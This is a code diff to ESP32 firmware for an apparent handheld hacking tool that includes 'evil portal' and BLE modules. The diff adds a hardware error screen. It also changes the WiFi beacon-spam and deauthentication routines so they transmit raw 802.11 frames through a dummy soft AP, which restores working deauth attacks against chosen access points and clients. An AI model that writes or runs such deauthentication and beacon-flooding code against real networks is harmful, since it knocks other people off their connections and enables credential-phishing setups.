@@ -25,6 +25,7 @@
 #include <RF24.h>
 
 // DR. HACK TOOL MODULES
+void dhShowError(const char* errMsg);
 #include "dh_wifi_tools.h"
 #include "dh_evil_portal.h"
 #include "dh_ble_tools.h"
@@ -107,6 +108,31 @@ static void dhExitScanline() {
     delay(3);
     tft.drawFastHLine(0, y, SCR_W, CLR_BG);
   }
+}
+
+// ═══════════════════════════════════════════════════════════
+// ERROR FEEDBACK — Global Hardware Error Screen
+// ═══════════════════════════════════════════════════════════
+
+static void dhShowError(const char* msg) {
+  tft.fillScreen(CLR_BG);
+  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
+  
+  drawGradientCard(2, 2, SCR_W - 4, SCALE_Y(14), CLR_SECONDARY, darkenColor(CLR_SECONDARY, 40), 0);
+  tft.setTextColor(CLR_TEXT_HI);
+  tft.drawString("HARDWARE ERROR", SCALE_X(4), SCALE_Y(2), 1);
+  
+  tft.setTextColor(CLR_TEXT_MED);
+  // Center multiline text approximation
+  tft.drawCentreString(msg, SCR_CX, SCALE_Y(40), 1);
+  
+  tft.setTextColor(CLR_TEXT_LO);
+  tft.drawCentreString("Check wiring & pins", SCR_CX, SCALE_Y(60), 1);
+  tft.drawCentreString("Press SEL to exit", SCR_CX, SCR_H - SCALE_Y(20), 1);
+  
+  // Wait for user acknowledgment
+  dhWaitSelectPress();
+  delay(200);
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -506,10 +532,12 @@ void dhRunBeaconSpam() {
   tft.drawCentreString("HOLD SELECT to stop", SCR_CX, SCR_H - SCALE_Y(12), 1);
 
   btStop(); // Disable Bluetooth to prevent RF coexistence panics
-  // Full low-level WiFi init required for raw 802.11 TX
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-  delay(50);
+  
+  // Full low-level WiFi init required for raw 802.11 TX on AP interface
+  dhNetPaused = true; 
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("dh_spam_temp", "12345678"); // Start a dummy AP so the driver brings up WIFI_IF_AP
+  delay(100);
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
 
@@ -587,6 +615,9 @@ void dhRunBeaconSpam() {
   }
 
   esp_wifi_set_promiscuous(false);
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_STA);
+  dhNetPaused = false;
   delay(100);
 }
 
@@ -610,7 +641,7 @@ static void dhSendDeauth(const uint8_t target[6], const uint8_t bssid[6]) {
   memcpy(&dhDeauthFrame[4], target, 6);
   memcpy(&dhDeauthFrame[10], bssid, 6);
   memcpy(&dhDeauthFrame[16], bssid, 6);
-  esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, dhDeauthFrame, sizeof(dhDeauthFrame), false);
+  esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, dhDeauthFrame, sizeof(dhDeauthFrame), false);
   if (rc == ESP_OK) dhDeauthPkts++;
   else dhDeauthErrs++;
 }
@@ -665,11 +696,12 @@ void dhRunDeauth() {
   sscanf(ap.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
          &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
 
-  // Full low-level WiFi init required for raw 802.11 TX
+  // Full low-level WiFi init required for raw 802.11 TX on AP interface
   btStop(); // Disable Bluetooth
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-  delay(50);
+  dhNetPaused = true;
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("dh_deauth_temp", "12345678"); // Start a dummy AP so the driver brings up WIFI_IF_AP
+  delay(100);
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
 
@@ -730,6 +762,9 @@ void dhRunDeauth() {
   }
 
   esp_wifi_set_promiscuous(false);
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_STA);
+  dhNetPaused = false;
   delay(100);
 }
 
